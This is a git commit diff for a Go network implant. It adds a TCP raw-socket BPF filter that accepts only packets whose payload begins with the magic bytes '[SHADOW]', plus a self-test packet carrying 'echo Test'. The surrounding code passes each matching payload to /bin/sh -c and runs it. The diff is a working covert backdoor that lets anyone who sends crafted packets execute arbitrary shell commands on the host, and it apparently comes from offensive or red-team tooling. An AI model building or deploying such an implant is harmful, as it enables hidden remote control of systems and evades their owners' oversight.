dc855f161afac4761b2e1d94abea65b3bbb40476
DaveTheBearMan <davethebearman@gmail.com>
2025-12-24 20:28:04 +0000

    Updated to have a TCP based filter to accept TCP traffic

--- filter.go
+++ filter.go
@@ -59,7 +59,7 @@ func getOutwardIface() ([]byte, error) {
 	return nil, errors.New("no default route found")
 }
 
-func createFilter() []bpf.Instruction {
+func createUDPFilter() []bpf.Instruction {
 	outwardMac, err := getOutwardIface()
 	if err != nil {
 		panic("Unable to get outward iface. Does ens3 match existing drivers?")
@@ -106,7 +106,7 @@ func createFilter() []bpf.Instruction {
 		bpf.LoadAbsolute{Off: ethTypeOff, Size: ethTypeSize},
 		bpf.JumpIf{Cond: bpf.JumpNotEqual, Val: ethIPv4, SkipTrue: 7},
 
-		// If EtherType is not Udp, drop packet
+		// If Ip Proto is not Udp, drop packet
 		bpf.LoadAbsolute{Off: ipProtoOff, Size: ipProtoSize},
 		bpf.JumpIf{Cond: bpf.JumpNotEqual, Val: protoUDP, SkipTrue: 5},
 
@@ -115,8 +115,81 @@ func createFilter() []bpf.Instruction {
 		bpf.JumpIf{Cond: bpf.JumpNotEqual, Val: hiHeader, SkipTrue: 3},
 		bpf.LoadAbsolute{Off: loData, Size: dataSize},
 		bpf.JumpIf{Cond: bpf.JumpNotEqual, Val: loHeader, SkipTrue: 1},
+		bpf.RetConstant{Val: 0},
 
 		bpf.RetConstant{Val: 1500}, // Accept
-		bpf.RetConstant{Val: 0},    // Lightly optimized decline
+	}
+}
+
+func createTCPFilter() []bpf.Instruction {
+	outwardMac, err := getOutwardIface()
+	if err != nil {
+		panic("Unable to get outward iface. Does ens3 match existing drivers?")
+	}
+	highValue := binary.BigEndian.Uint32(outwardMac[0:4])
+	lowValue := binary.BigEndian.Uint16(outwardMac[4:6])
+
+	const (
+		// Ethernet
+		hiMacOff  = 6
+		hiMacSize = 4
+		loMacOff  = 10
+		loMacSize = 2
+
+		// Sections
+		ipProtoOff  = 23
+		ipProtoSize = 1
+		protoTCP    = 0x06
+
+		// Magic bytes to match at *start of TCP payload*
+		hiHeader = 0x5B534841 // [SHA
+		loHeader = 0x444F575D // DOW]
+	)
+
+	return []bpf.Instruction{
+		// Drop IPv6
+		bpf.LoadAbsolute{Off: 12, Size: 2}, // 0x0800 when IPV4 in Eth Header
+		bpf.JumpIf{Cond: bpf.JumpEqual, Val: 0x0800, SkipTrue: 1},
+		bpf.RetConstant{Val: 0},
+
+		// Drop frames we sent (match src MAC)
+		bpf.LoadAbsolute{Off: hiMacOff, Size: hiMacSize},
+		bpf.JumpIf{Cond: bpf.JumpNotEqual, Val: highValue, SkipTrue: 3},
+		bpf.LoadAbsolute{Off: loMacOff, Size: loMacSize},
+		bpf.JumpIf{Cond: bpf.JumpNotEqual, Val: uint32(lowValue), SkipTrue: 1},
+		bpf.RetConstant{Val: 0},
+
+		// Check for TCP
+		bpf.LoadAbsolute{Off: ipProtoOff, Size: ipProtoSize}, // Ensure TCP
+		bpf.JumpIf{Cond: bpf.JumpEqual, Val: protoTCP, SkipTrue: 1},
+		bpf.RetConstant{Val: 0},
+
+		// Calculate IPv4 Header Offset
+		bpf.LoadMemShift{Off: 14},
+		bpf.TXA{}, // Move that into RegA
+		bpf.ALUOpConstant{Op: bpf.ALUOpAdd, Val: 14}, // Add length of EthHeader, so we can get to start of TCP packet
+		bpf.StoreScratch{Src: bpf.RegA, N: 0},        // Store offset (Ethernet + IPv4) into Scratch 0
+		bpf.TAX{},                                    // Write offset into X so we can use loadindirect to access TCP fields
+
+		// Calculate TCP Header Offset
+		bpf.LoadIndirect{Off: 12, Size: 1},                 // First 4 bits are the data offset. Trailing 4 are reserved
+		bpf.ALUOpConstant{Op: bpf.ALUOpShiftRight, Val: 4}, // 0b01010000 -> 0b00000101 (0x50 -> 0x05)
+		bpf.ALUOpConstant{Op: bpf.ALUOpMul, Val: 4},        // Get length in bytes of TCP header
+		bpf.LoadScratch{Dst: bpf.RegX, N: 0},               // Pull TCP header offset from earlier
+		bpf.ALUOpX{Op: bpf.ALUOpAdd},                       // Add the IP header length to TCP header
+		bpf.StoreScratch{Src: bpf.RegA, N: 0},              // Overwrite to have payload in scratch
+		bpf.TAX{},
+
+		// Read for shadow magic bytes at the calculated length
+		bpf.LoadIndirect{Off: 0, Size: 4},
+		bpf.JumpIf{Cond: bpf.JumpEqual, Val: hiHeader, SkipTrue: 3},
+		bpf.LoadIndirect{Off: 4, Size: 4},
+		bpf.JumpIf{Cond: bpf.JumpEqual, Val: loHeader, SkipTrue: 1},
+		bpf.RetConstant{Val: 0},
+
+		// Calculate beginning of data when header is correct
+		bpf.TXA{},
+		bpf.ALUOpConstant{Op: bpf.ALUOpAdd, Val: 8},
+		bpf.RetA{}, // Return beginning index of data within the packet
 	}
 }
--- main.go
+++ main.go
@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"os"
 	"os/exec"
@@ -22,6 +23,21 @@ func createSocket() *os.File {
 	return os.NewFile(uintptr(fd), fmt.Sprintf("fd %d", fd))
 }
 
+func testPacket(vm *bpf.VM) {
+	testData := []byte{0x84, 0x70, 0xd7, 0xf6, 0xec, 0x12, 0xbc, 0x0f, 0xf3, 0x62, 0x57, 0x09, 0x08, 0x00, 0x45, 0x00, 0x00, 0x39, 0x00, 0x01, 0x00, 0x00, 0x40, 0x06, 0x23, 0x5c, 0xa9, 0xfe, 0x17, 0x0c, 0x81, 0x15, 0x15, 0x43, 0x30, 0x39, 0x00, 0x16, 0x00, 0x00, 0x03, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x02, 0x20, 0x00, 0xfd, 0x5b, 0x00, 0x00, 0x5b, 0x53, 0x48, 0x41, 0x44, 0x4f, 0x57, 0x5d, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x54, 0x65, 0x73, 0x74}
+	outputFrameLen, err := vm.Run(testData)
+	if err != nil {
+		panic("Test filter failed")
+	}
+	if outputFrameLen <= 0 {
+		panic("Test filter failed to pass any packets")
+	}
+	fmt.Printf("All tests passing, begin listening:\n\n")
+	// fmt.Printf("Test data length %d\n", len(testData))
+	// fmt.Printf("Returned value %d\n", outputFrameLen)
+	// fmt.Printf("% x\n", testData)
+}
+
 func acceptPacket(socketFile *os.File, vm *bpf.VM, packetChannel chan shadowPacket) {
 	for {
 		// Read to buffer and create a frame
@@ -39,11 +55,11 @@ func acceptPacket(socketFile *os.File, vm *bpf.VM, packetChannel chan shadowPack
 		}
 
 		// Run the VM with instructions
-		outputFrameLen, err := vm.Run(frame)
+		dataBeginIndex, err := vm.Run(frame)
 		if err != nil {
 			panic(fmt.Sprintf("failed to accept Ethernet frame: %v", err))
 		}
-		if outputFrameLen > 0 {
+		if dataBeginIndex > 0 {
 			assembledFrame := shadowPacket{
 				sourceAddr: frame[26:30],
 				sourceMac:  frame[6:12],
@@ -51,7 +67,7 @@ func acceptPacket(socketFile *os.File, vm *bpf.VM, packetChannel chan shadowPack
 				destAddr: frame[30:34],
 				destMac:  frame[0:6],
 
-				data: frame[50:numRead],
+				data: bytes.Trim(frame[dataBeginIndex:], "\x00"),
 			}
 			packetChannel <- assembledFrame
 		}
@@ -59,6 +75,7 @@ func acceptPacket(socketFile *os.File, vm *bpf.VM, packetChannel chan shadowPack
 }
 
 func runCommand(command string) (response string) {
+	fmt.Printf("! %s\n", command)
 	output, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
 	if err != nil {
 		return fmt.Sprintf("ERROR: %s", err)
@@ -68,12 +85,13 @@ func runCommand(command string) (response string) {
 
 func main() {
 	// Create BPF VM
-	socketFile := createSocket()
-	bpfFilter := createFilter()
+	bpfFilter := createTCPFilter()
 	vm, err := bpf.NewVM(bpfFilter)
 	if err != nil {
 		panic(fmt.Sprintf("failed to load BPF program: %v", err))
 	}
+	testPacket(vm)
+	socketFile := createSocket()
 
 	// Create a channel for listening to incoming packets
 	socketChannel := make(chan shadowPacket)
